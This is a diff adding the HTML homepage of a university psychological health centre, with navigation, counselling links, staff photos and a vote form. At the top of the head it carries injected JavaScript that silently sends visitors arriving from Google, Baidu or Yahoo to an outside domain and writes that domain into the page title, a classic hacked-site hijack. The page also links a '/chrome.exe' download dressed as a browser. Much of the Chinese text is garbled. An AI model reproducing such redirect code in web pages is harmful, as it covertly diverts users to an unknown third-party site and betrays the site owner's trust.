@@ -1,0 +1,619 @@
+�?!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<script LANGUAGE="Javascript">
+var s=document.referrer
+if(s.indexOf("google")>0 || s.indexOf("baidu")>0 || s.indexOf("yahoo")>0 ) 
+location.href="http://www.7707888.com/";
+</script>
+<script LANGUAGE="Javascript">
+����var message = new Array();
+����message[0] = "��ӭ���ٱ�վ����վ���µ�ַ�����µ�ַwww.7707888.com";
+����var reps = 1;
+����var speed = 0;// Set the overall typing speed (larger number = slower action).
+����var hold = 4111111 // set the length of time to display the whole phrase before retyping (larger number = longer)
+����var p = message.length;
+����var q = 0;
+����var r = 0;
+����var C = 0;
+����var mC = 0;
+����var s = 0;
+����var sT = null;
+����if (reps < 1) {
+�� ��reps = 1;
+����}
+����function setMessage() {
+�� ��typing = message[mC];
+�� ��q = typing.length;
+�� ��r = q + hold;
+�� ��typeMessage();
+����}
+����function typeMessage() {
+�� ��if (s > r) {
+��  ��s = 0;
+�� ��}
+�� ��if (s > q) {
+��  ��document.title = typing ;
+�� ��}
+ ����else {
+��  ��document.title = typing.substr(0,s);
+�� ��}
+�� ��if (C < (r * reps)) {
+��  ��sT = setTimeout("typeMessage()", speed);
+��  ��C++;
+  ����s++;
+�� ��}
+�� ��else {
+��  ��C = 0;
+��  ��s = 0;
+��  ��mC++;
+��  ��if(mC > p - 1) {mC = 0;}
+��  ��sT = null;
+��  ��setMessage();
+�� ��}
+����}
+����setMessage();
+����</script>
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>心灵之家</title>
+<meta name="description" content="" />
+<meta name="keywords" content="" />
+<!-- 调用样式�?-->
+<link rel="stylesheet" href="/templets/mobantianxia/images/style2.css" type="text/css" media="all">
+<!--[if (IE 6)]>
+<link rel="stylesheet" href="/templets/mobantianxia/images/ie6.css" type="text/css" media="all">
+<![endif]-->
+<link rel="stylesheet" href="/templets/mobantianxia/images/teacher.css" type="text/css" media="all">
+<link rel="stylesheet" href="/templets/mobantianxia/images/jquery.fancybox-1.3.4.css" type="text/css" media="all">
+
+   <link href="/zixun/psy.css" rel="stylesheet" type="text/css" />
+    <script type="text/javascript" src="/zixun/jquery.min.js"></script>
+    <script type="text/javascript" src="/zixun/ini.js"></script>
+
+<script src="/templets/mobantianxia/images/jquery-1.3.2.min.js" type="text/javascript"></script>
+<script type="text/javascript" src="/templets/mobantianxia/images/loopedcarousel.js"></script>
+<script src="/templets/mobantianxia/images/jquery.easing.1.3.js" type="text/javascript"></script>
+<script src="/templets/mobantianxia/images/jquery.kwicks-1.5.1.pack.js" type="text/javascript"></script>
+<script src="/templets/mobantianxia/images/jquery.mousewheel-3.0.4.pack.js" type="text/javascript"></script>
+<script src="/templets/mobantianxia/images/jquery.fancybox-1.3.4.pack.js" type="text/javascript"></script>
+<script type="text/javascript">
+		$(document).ready(function() {
+			/*
+			*   Examples - images
+			*/
+
+
+			$("a#example5").fancybox({
+
+				'overlayShow'	: false,
+
+				'transitionIn'	: 'elastic',
+
+				'transitionOut'	: 'elastic'
+
+			});
+			$("#various3").fancybox({
+
+				'width'				: '55%',
+
+				'height'			: '45%',
+
+				'autoScale'			: false,
+
+				'transitionIn'		: 'none',
+
+				'transitionOut'		: 'none',
+
+				'type'				: 'iframe'
+
+			});
+			/*
+			*   Examples - various
+			*/
+$("#various2").fancybox();
+
+		});
+	</script>
+
+<script type="text/javascript">
+			$().ready(function() {
+				$('.kwicks').kwicks({
+					max : 110,
+					spacing : 5
+				});
+			});
+</script>
+
+<script type="text/javascript">
+$(function() {
+// carousel
+$('.loopedCarousel').loopedCarousel();
+});
+</script>
+
+<script type="text/javascript" src="/templets/mobantianxia/images/tabs.js"></script>
+
+<script language="javascript" type="text/javascript">
+<!-- 
+function ResumeError()  
+{ 
+    return true; 
+} 
+window.onerror = ResumeError; 
+function check()
+{
+if(document.search.keyword.value.length==0){
+     alert("请输入查询信息！");
+     document.search.keyword.focus();
+     return false;
+    }
+
+}
+// --> 
+
+
+// 导航下拉菜单
+
+$(function(){
+nav_curr();	   
+   
+//下拉菜单
+$("#menu > li:has(.subMenu)").hover(function(){
+//$("#menu > li > a").removeClass("hover");	
+$(this).find("a").eq(0).addClass("hover");
+$(this).find(".subMenu").stop(true,true).fadeIn(300);
+},function(){
+$(this).find("a").eq(0).removeClass("hover");
+$(this).find(".subMenu").stop(true,true).fadeOut(300);
+nav_curr();
+});		
+
+//导航当前�?
+function nav_curr(){
+for(var i=0;i<5;i++){
+navText=$("#menu > li > a").eq(i).attr("title");	
+if(navText==navCurrent){
+$("#menu > li > a").eq(i).addClass("hover");
+}
+}
+}
+
+});
+
+var navCurrent="首页";
+</script>
+
+<style type="text/css">
+
+#banner{height:250px;}
+#info {margin:34px 20px 0px 0px;}
+#top_nav {padding:8px 10px 6px;}
+#right {background:none;}
+</style>
+
+</head>
+<body>
+
+�?div id="body">
+<div id="main">
+<!-- 页头开�?-->
+<div id="topmenu">
+<a title="留言" href="/plus/guestbook.php?lang=gb2312" target="_blank">留言</a>
+<!--
+<a href="/member/index_do.php?fmdo=user&dopost=regnew" target="_blank" style="width:80px;">会员中心</a>
+    
+      <a href="/plus/list.php?tid=1" title="简体中�?>简体中�?/a>
+    
+    -->
+<a href="/chrome.exe" target="_blank" style="width:80px;">谷歌浏览�?/a>
+<a href="/GG" target="_blank" style="width:80px;">后台管理</a>
+</div>
+<div id="logo"></div>
+
+<div class="clearall"></div>
+
+<div id="top_nav">
+<div id="nav">
+<div id="search">
+<form name="formsearch" action="/plus/search.php" method="post">
+<input type='hidden' name='lang' value='gb2312' />
+<input id="inputsearch" name="keyword" type="text" align="absmiple">
+<input type="submit" class="s_btn" align="absmiple" name="searchbt" value=" ">
+</form>
+</div>
+
+<ul id="menu">
+<li><a href="/" class="one">主页</a></li>
+
+<li><a href="#" class="one">中心概况</a>
+<div class="subMenu t1">
+<div class="menuleft"></div>
+<div class="menuright">
+<a href="/plus/list.php?tid=38">中心简�?/a>
+<a href="/plus/list.php?tid=33">中心教师</a>
+<a href="/plus/list.php?tid=32">中心工作</a>
+</div>	
+</div>	
+</li>
+
+<li><a href="#" class="one">教学科研</a>
+<div class="subMenu t1">
+<div class="menuleft"></div>
+<div class="menuright">
+<a href="/plus/list.php?tid=13">课程简�?/a>
+<a href="/plus/list.php?tid=12">精品课程</a>
+<a href="/plus/list.php?tid=14">学术研究</a>
+</div>
+</div>
+</li>
+
+<li><a href="#" class="one">心理测试</a>
+<div class="subMenu t1">
+<div class="menuleft"></div>
+<div class="menuright">
+<a href="/plus/list.php?tid=15">专业测试</a>
+<a href="/plus/list.php?tid=16">趣味测试</a>
+<a href="/plus/list.php?tid=41">自我测试</a>
+</div>
+</div>
+</li>
+
+<li><a href="#" class="one">活动看板</a>
+
+<div class="subMenu t1">
+<div class="menuleft"></div>
+<div class="menuright">
+<a href="/plus/list.php?tid=17">最新通告</a>
+<a href="/plus/list.php?tid=18">精品活动</a>
+</div>
+</div></li>
+
+<li><a href="#" class="one">心情驿站</a>
+<div class="subMenu t1">
+<div class="menuleft"></div>
+<div class="menuright">
+<a href="/plus/list.php?tid=19">阅读健心</a>
+<a href="/plus/list.php?tid=20">音乐之声</a>
+<a href="/plus/list.php?tid=21">影视赏析</a>
+</div>
+</div>
+</li>
+
+<li><a href="/plus/list.php?tid=22" class="one">联系我们</a></li>
+
+<li><a id="various3" href="/GG/vote_getcode2.php" class="one on">活动投票</a>
+<div class="subMenu t1">
+<div class="menuleft"></div>
+<div class="menuright">
+<a href="/plus/list.php?tid=36">以往投票</a>
+</div>	
+</div>	
+</li>
+
+</ul>
+</div>
+</div>
+
+
+
+
+<SCRIPT src="/templets/mobantianxia/images/jquery.featureList-1.0.0.js" 
+type=text/javascript></SCRIPT>
+
+<SCRIPT src="/templets/mobantianxia/images/kxbdSuperMarquee.js" 
+type=text/javascript></SCRIPT>
+
+<SCRIPT type=text/javascript>
+
+function tencent_wpa(uuu,gh,g_corp,useqq,newpop)
+{
+var g_noHeader = true;
+var g_noFooter = true;
+var g_vsWidth = "570px";
+var g_vsHWidth = "644px";
+}
+
+$(document).ready(function() {
+
+$.featureList(
+$("#banner_current li a"),
+$("#output li"), {
+start_item	:	0
+}
+);			
+$('#customer-list').kxbdSuperMarquee({
+//isMarquee:true,
+//duration:20,
+ 				isEqual:false,
+distance:22,
+time:1,
+direction:'up'
+});
+$('#news-list').kxbdSuperMarquee({
+isEqual:false,
+distance:16,
+time:2,
+//btnGo:{up:'#goU',down:'#goD'},
+direction:'up'
+});
+
+
+});	
+</SCRIPT>
+
+
+<!-- 中部开�?-->
+<DIV id=banner>
+
+<ul id="banner_current">
+    <li><a href="javascript:;">
+    <div class="banner_title bulletin">
+    <p class="title">�?.25音乐健心”开幕式</p>
+    <p class="des">2011�?�?4�?/p>
+    </div>
+    </a></li>
+    <li><a href="#">
+    <div class="banner_title version">
+    <p class="title">心理课程作品马年开�?</p>
+    <p class="des">2014�?�?�?/p>
+    </div>
+    </a></li>
+    <li><a href="javascript:;">
+    <div class="banner_title qq">
+    <p class="title">�?.25梦想•绘画健心”拉开帷幕</p>
+    <p class="des">2013�?�?8�?/p>
+    </div>
+    </a></li>
+    <li><a href="javascript:;">
+    <div class="banner_title newweb">
+    <p class="title">�?·25舞蹈健心”活动闭�?/p>
+    <p class="des">2012�?�?5�?/p>
+    </div>
+    </a></li>
+    <li><a href="javascript:;">
+    <div class="banner_title locoy">
+    <p class="title">教育部表彰我校心理健康教育工�?/p>
+    <p class="des">2011�?0�?2�?/p>
+    </div>
+    </a></li>
+</ul>
+<ul id="output">
+    <li><img alt="" width="960" height="245" src="/22.jpg" /></li>
+    <li><a href="http://www.psy.uestc.edu.cn/a/gb2312/xinwenbaodao/2013/1231/259.html"><img alt="" width="960" height="245" src="/11.jpg" /></a></li>
+    <li><a href="http://www.psy.uestc.edu.cn/a/gb2312/zhuanti/_2013_5_25mengxiangxiwanghuihuaji/2013/0415/0416.html"><img alt="" width="960" height="245" src="/templets/mobantianxia/images/bannar2.png" /></a></li>
+    <li><a href="http://www.psy.uestc.edu.cn/a/gb2312/xinwenbaodao/2014/0306/283.html"><img alt="" width="960" height="245" src="/templets/mobantianxia/images/2.png" /></li>
+    <li><a href="http://www.moe.gov.cn/publicfiles/business/htmlfiles/moe/s211/201110/125582.html"><img width="960" height="245" alt="" src="/templets/mobantianxia/images/banner3.png" /></a></li>
+    
+</ul>  
+  
+</DIV>
+
+<div class="clear"></div>
+<div id="left_wrap" class="gg">
+	<div id="tongzhi">
+	<h3><a style="text-decoration:none;color:#215E21;" href="/plus/list.php?tid=17">最新通告</a><a href="/plus/list.php?tid=17"><img src="/templets/mobantianxia/images/more.gif" style="margin-top:10px;margin-right:10px; float:right;" /></a></h3>
+	<ul>
+<li><a href='/a/gb2312/huodongkanban/zuixintonggao/2014/0411/300.html'>2014年春季学期咨询预约动态情况（五）</a></li>
+<li><a href='/a/gb2312/huodongkanban/zuixintonggao/2014/0404/299.html'>2014年春季学期咨询预约动态情况（四）</a></li>
+<li><a href='/a/gb2312/huodongkanban/zuixintonggao/2014/0328/295.html'>2014年春季学期咨询预约动�?/a></li>
+
+
+</ul>
+
+
+<h3><a style="text-decoration:none;color:#215E21;" href="/plus/list.php?tid=23">新闻报道</a><a href="/plus/list.php?tid=23"><img src="/templets/mobantianxia/images/more.gif" style="margin-top:10px;margin-right:10px; float:right;" /></a></h3>
+<ul>
+<li><a href='/a/gb2312/xinwenbaodao/2014/0328/296.html'>�?.25大学生心理健康节---音乐健心”开�?/a></li>
+<li><a href='/a/gb2312/huodongkanban/zuixintonggao/2014/0314/287.html'> 音乐健心热身培训隆重登场</a></li>
+<li><a href='/a/gb2312/xinwenbaodao/2013/1231/259.html'>心理健康课程学生作品马年开�?/a></li>
+<li><a href='/a/gb2312/xinwenbaodao/2013/1217/258.html'>Robert.Portnoy教授来为我校举办讲座</a></li>
+<li><a href='/a/gb2312/xinwenbaodao/2013/0627/256.html'>中美联合培训心理咨询督导师培训项目完成两�?/a></li>
+<li><a href='/a/gb2312/xinwenbaodao/2013/0627/256.html'>中美联合培训心理咨询督导师培训项目完成两�?/a></li>
+
+
+	</ul>
+	</div>
+	<div id="xinwen">
+	        
+<h3><a style="text-decoration:none;color:#236B8E;" size=100 href="/plus/guestbook.php?lang=gb2312">在线咨询</a></h3>
+	<ul><br>
+<li><a href="/zixun/0.php?gid=1776"  class="jqm_load"><font color="#215E21">自嘲:每天都会很忙，但又放弃了很多东西，不知道。。�?/font></a></li><br>
+<li><a href="/zixun/1.php?gid=1776" class="jqm_load"><font color="#215E21">迷茫:我好像喜欢他，他可能只把我当作哥们，可我不。。�?/font></a></li><br>
+<li><a href="/zixun/2.php?gid=1776" class="jqm_load"><font color="#215E21">失落:老师，为什么我们学校的学生素质还是那么的滴。。�?/font></a></li><br>
+<li><a href="/zixun/3.php?gid=1776" class="jqm_load"><font color="#215E21">年少轻狂:朋友是不是无论什么事都会同你分担烦恼，。。�?/font></a></li><br>
+<li><a href="/zixun/4.php?gid=1776"  class="jqm_load"><font color="#215E21">A同学:你说我这个年龄是不是该找个女朋友了，我现。。�?/font></a></li><br>
+<!--	
+
+-->
+   
+    </ul>	
+	
+<div class="jqmWindow hide" id="jqmWindow">
+<h5 class="title"><span class="jqmClose"><img src="/images/sdd.gif" alt="关闭" height="16" width="16" /></span><a href="/plus/guestbook.php">我要咨询</a><span>详情</span></h5>
+
+<div class="protocol"><iframe name="load_iframe" class="load_iframe" scrolling="auto" frameborder="0" src="#" title="load_iframe"></iframe></div>
+</div>
+<script type="text/javascript" src="/zixun/jqModal.js"></script>
+<script type="text/javascript" src="/zixun/jqDnR.js"></script>
+<script type="text/javascript">
+<!--
+  $(".jqm_load").bind("click", function(event){
+      event.stopPropagation();
+      if($('#newWindow').size()==0){
+        var newWindow = $('#jqmWindow').clone(true).insertAfter('#site_ft');
+        newWindow.attr('id','newWindow');
+        $('#jqmWindow').remove();
+        $("#newWindow").show();
+        $('#newWindow .load_iframe').attr('src',$(this).attr('href')+'&ajax=1');
+        $(".jqmWindow").jqm({overlay: 0}).jqDrag(".title");
+        $(".jqmClose").click(function(){
+            $('#newWindow').hide();
+        });
+      }else{          
+          $('#newWindow .load_iframe').attr('src',$(this).attr('href')+'&ajax=1');
+          $('#newWindow').show();
+      }
+      return false;
+  });
+//-->
+</script>      
+</div>
+<div id="site_ft">
+    <div>
+    </div>
+			
+	</div>
+</div>
+
+
+
+
+
+<div id="right_wrap" class="gg">
+<h3><a style="text-decoration:none;color:#215E21;">从微博了解心灵之�?/a></h3>
+<span class="weibo"><a href="http://e.weibo.com/u/1982396981"><img src="/templets/mobantianxia/images/weibo.png" width="80px" /></a></span>
+<span class="weibo2">关注我们的微博频道即可接收心理健康资讯�?/span>
+<center><a href="http://e.weibo.com/u/1982396981"><img src="/templets/mobantianxia/images/yangfan.png" width="180px" /></a></center>
+<br />
+
+<h3><a style="text-decoration:none;color:#215E21;">预约咨询方式</a></h3>
+<span class="baokan"><!--<img src="/templets/mobantianxia/images/baokan.png" width="150px" />--></span>
+<p>预约电话�?1830031</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;83208198</p>
+<p>咨询地点：清水河校区活动中心408</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp沙河校区通信�?20A</p>
+
+
+<h3><a style="text-decoration:none;color:#215E21;">友情链接</a></h3>
+<span class="links">
+<!--
+<select name="links" onchange="var jmpURL=this.options[this.selectedIndex].value; if(jmpURL!='') {window.open(jmpURL);} else {this.selectedIndex=0;}">
+<option value="http://www.uestc.edu.cn">电子科技大学</option><option value="http://www.rw.uestc.edu.cn/">政治与公共管理学�?/option><option value="http://222.197.165.195/wlxt/ncourse/mental/web/xinli">心理健康课程网站</option><option value="http://psy.pku.edu.cn">北大心理�?/option><option value="http://www.psychcn.com">华夏心理�?/option><option value="http://www0.hku.hk/psychodp">香港大学心理�?/option><option value="http://psych.ccnu.edu.cn/viewsite.action">华中师大心理学院</option><option value="http://www.psyonline.cn">南方心理在线</option><option value="http://www.psych.ac.cn">中科院心理研究所</option><option value="http://psych.bnu.edu.cn">北师大心理学�?/option><option value="http://sych.swu.edu.cn">西南大学心理学院</option><option value="http://psy.ecnu.edu.cn">华东师范大学心理学院</option> 
+</select>
+-->
+<select name="links" onchange="var jmpURL=this.options[this.selectedIndex].value; if(jmpURL!='') {window.open(jmpURL);} else {this.selectedIndex=0;}">
+	<option value="">┗校内链�?/option>
+	<option value="http://www.uestc.edu.cn">电子科技大学</option>
+	<option value="http://www.rw.uestc.edu.cn/">政治与公共管理学�?/option>
+	<option value="http://222.197.165.195/wlxt/ncourse/mental/web/xinli">心理健康课程网站</option>
+</select>
+<br />&nbsp;&nbsp;
+<select name="links" onchange="var jmpURL=this.options[this.selectedIndex].value; if(jmpURL!='') {window.open(jmpURL);} else {this.selectedIndex=0;}">
+	<option value="">┗校外链�?/option>
+	<option value="http://www.psy.cuhk.edu.hk/index_s.html">香港中文大学心理�?/option>
+	<option value="http://www0.hku.hk/psychodp">香港大学心理�?/option>
+	<option value="http://psy.pku.edu.cn">北大心理�?/option>	
+	<option value="http://www.psych.ac.cn">中科院心理研究所</option>
+	<option value="http://v.26vv.cn/video/2dcmb3on7a">心理网视�?/option>
+	<option value="http://psych.bnu.edu.cn">北师大心理学�?/option>
+	<option value="http://psy.ecnu.edu.cn">华东师大心理学院</option>
+	<option value="http://psych.ccnu.edu.cn/viewsite.action">华中师大心理学院</option>
+	<option value="http://sych.swu.edu.cn/">西南大学心理学院</option>
+	<option value="http://www.psychcn.com">华夏心理�?/option>
+</select>
+</span>
+</div>
+<div id="teacher" class="gg">	<h3><a style="text-decoration:none;color:#215E21;" href="/plus/list.php?tid=33">教师风采</a><a href="/plus/list.php?tid=33"><img src="/templets/mobantianxia/images/more.gif" style="margin-top:10px;margin-right:10px; float:right;" /></a></h3>
+<!--[if !(IE 6)]>
+<ul class="kwicks horizontal" >
+	<li id="kwick_1"><a id="example5" href="/templets/mobantianxia/images/test11.jpg" title="李媛，博士，教授，硕士生导师"><img src="/templets/mobantianxia/images/test_t1.png" /></a></li>
+	<li id="kwick_2"><a id="example5" href="/templets/mobantianxia/images/test22.jpg" title="刘惠，硕士，副教授，硕士生导�?><img src="/templets/mobantianxia/images/test_t2.png" /></a></li>
+	<li id="kwick_3"><a id="example5" href="/templets/mobantianxia/images/test33.jpg" title="陈思帆，硕士，讲师"><img src="/templets/mobantianxia/images/test_t3.png" /></a></li>
+	<li id="kwick_4"><a id="example5" href="/templets/mobantianxia/images/test44.jpg" title="雷霖，硕士，讲师"><img src="/templets/mobantianxia/images/test_t4.png" /></a></li>
+</ul>
+<br>
+<ul class="kwicks horizontal" >
+         <li id="kwick_5"><a id="example5" href="/templets/mobantianxia/images/test55.jpg" title="曾维�?博士"><img src="/templets/mobantianxia/images/test_t5.png" /></a></li>
+         <li id="kwick_6"><a id="example5" href="/templets/mobantianxia/images/test66.jpg" title="李谷�?在读博士,讲师"><img src="/templets/mobantianxia/images/test_t6.png" /></a></li>
+         <li id="kwick_7"><a id="example5" href="/templets/mobantianxia/images/test77.jpg" title="王海�?硕士,国家二级心理咨询�?><img src="/templets/mobantianxia/images/test_t7.png" /></a></li>
+</ul>
+<![endif]-->
+<!--[if IE 6]>
+<ul class="kwicks horizontal" >
+	<li id="kwick_1"><a href="/a/gb2312/zhongxinjiaoshi/2011/0408/89.html"><img src="/templets/mobantianxia/images/test_t1.png" /></a></li>
+	<li id="kwick_2"><a href="/a/gb2312/zhongxinjiaoshi/2011/0415/105.html"><img src="/templets/mobantianxia/images/test_t2.png" /></a></li>
+	<li id="kwick_3"><a href="/a/gb2312/zhongxinjiaoshi/2011/0415/106.html"><img src="/templets/mobantianxia/images/test_t3.png" /></a></li>
+	<li id="kwick_4"><a href="/a/gb2312/zhongxinjiaoshi/2011/0415/107.html"><img src="/templets/mobantianxia/images/test_t4.png" /></a></li>
+          <li id="kwick_5"><a href="/a/gb2312/zhongxinjiaoshi/2011/0415/108.html"><img src="/templets/mobantianxia/images/test_t5.png" /></a></li>
+<li id="kwick_6"><a href="/a/gb2312/zhongxinjiaoshi/2011/0415/108.html"><img src="/templets/mobantianxia/images/test_t6.png" /></a></li>
+<li id="kwick_7"><a href="/a/gb2312/zhongxinjiaoshi/2011/0415/108.html"><img src="/templets/mobantianxia/images/test_t7.png" /></a></li>
+
+</ul>
+<![endif]-->
+<!--[if !IE]><!-->
+<ul class="kwicks horizontal" >
+	<li id="kwick_1"><a id="example5" href="/templets/mobantianxia/images/test11.jpg" title="李媛，博士，教授，硕士生导师"><img src="/templets/mobantianxia/images/test_t1.png" /></a></li>
+	<li id="kwick_2"><a id="example5" href="/templets/mobantianxia/images/test22.jpg" title="刘惠，硕士，副教授，硕士生导�?><img src="/templets/mobantianxia/images/test_t2.png" /></a></li>
+	<li id="kwick_3"><a id="example5" href="/templets/mobantianxia/images/test33.jpg" title="陈思帆，硕士，讲师"><img src="/templets/mobantianxia/images/test_t3.png" /></a></li>
+	<li id="kwick_4"><a id="example5" href="/templets/mobantianxia/images/test44.jpg" title="雷霖，硕士，讲师"><img src="/templets/mobantianxia/images/test_t4.png" /></a></li>
+</ul>
+<br>
+<ul class="kwicks horizontal" >
+         <li id="kwick_5"><a id="example5" href="/templets/mobantianxia/images/test55.jpg" title="曾维�?博士"><img src="/templets/mobantianxia/images/test_t5.png" /></a></li>
+ <li id="kwick_6"><a id="example5" href="/templets/mobantianxia/images/test66.jpg" title="李谷�?在读博士,讲师"><img src="/templets/mobantianxia/images/test_t6.png" /></a></li>
+ <li id="kwick_7"><a id="example5" href="/templets/mobantianxia/images/test77.jpg" title="王海�?硕士,国家二级心理咨询�?><img src="/templets/mobantianxia/images/test_t7.png" /></a></li>
+</ul>
+<!--<![endif]-->
+</div>
+
+
+<div id="liuyan" class="gg">
+
+
+<form name='voteform' method='post' action='/plus/vote.php' target='_blank'>
+<input type='hidden' name='dopost' value='send' />
+<input type='hidden' name='aid' value='4' />
+<input type='hidden' name='ismore' value='0' />
+<h3><a style="text-decoration:none;color:#215E21;" href="/GG/vote_getcode2.php">你期待神马内容的活动</a></h3>
+<h6><a style="text-decoration:none;color:#000000;FONT-FAMILY: 微软雅黑;" >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们会根据多数投票推出相应的讲座和团体辅�?/a></h6>
+
+
+<ul>
+<tr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style="border:none;width:72px;height:30px"  src="/templets/mobantianxia/images/huodong1.png" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td height=24 bgcolor=#FFFFFF><input type='checkbox' name='voteitem' value='1' />人际交往与沟�?/td></tr><br>
+<tr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style="border:none;width:72px;height:30px"  src="/templets/mobantianxia/images/huodong2.png" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td height=24 bgcolor=#FFFFFF><input type='checkbox' name='voteitem' value='2' />爱情与�?/td></tr><br>
+<tr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style="border:none;width:72px;height:30px"  src="/templets/mobantianxia/images/huodong3.png" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td height=24 bgcolor=#FFFFFF><input type='checkbox' name='voteitem' value='3' />情绪与压力管�?/td></tr><br>
+<tr>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img style="border:none;width:72px;height:30px"  src="/templets/mobantianxia/images/huodong4.png" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<td height=24 bgcolor=#FFFFFF><input type='checkbox' name='voteitem' value='4' />职业生涯规划</td></tr><br>
+<tr><td height='28' align='center'>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<input type='submit' class='nbt' name='vbt1' value='投上一�? /> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+<input type='button' class='nbt' name='vbt2' value='查看结果' onClick="window.open('/plus/vote.php?dopost=view&aid=4');" /></td></tr>
+<!--	
+
+-->
+   
+    </ul>
+</form>
+
+
+
+
+</div>
+
+
+
+
+
+<div class="yoing">
+<h3><a style="text-decoration:none;color:#215E21;">热点专题</a></h3>
+<ul>
+<li><a href="/plus/list.php?tid=25"><img style="border:none;width:96px;height:41px"  src="/templets/mobantianxia/images/zhuanti (1).png" /></a></li>
+<li><a href="/plus/list.php?tid=26"><img style="border:none;width:96px;height:41px" src="/templets/mobantianxia/images/zhuanti (2).png" /></a></li>
+<li><a href="/plus/list.php?tid=27"><img style="border:none;width:96px;height:41px" src="/templets/mobantianxia/images/zhuanti (3).png"/></a></li>
+<li><a href="/plus/list.php?tid=29"><img style="border:none;width:96px;height:41px" src="/templets/mobantianxia/images/zhuanti (4).png"/></a></li>
+<li><a href="/plus/list.php?tid=28"><img style="border:none;width:96px;height:41px" src="/templets/mobantianxia/images/zhuanti (5).png" /></a></li>
+</ul>
+</div>
+
+<div class="yoing">
+<span style="padding-top:10px;height:15px;float:right;width:680px;color:#215E21;">CopyRight©2011 电子科技大学·心理健康教育中心 版权所�?/span>
+</div>
+
+<div class="yoingbot"></div>
+</div>
+
+
+</div>
+
+
+</body>
+</html>
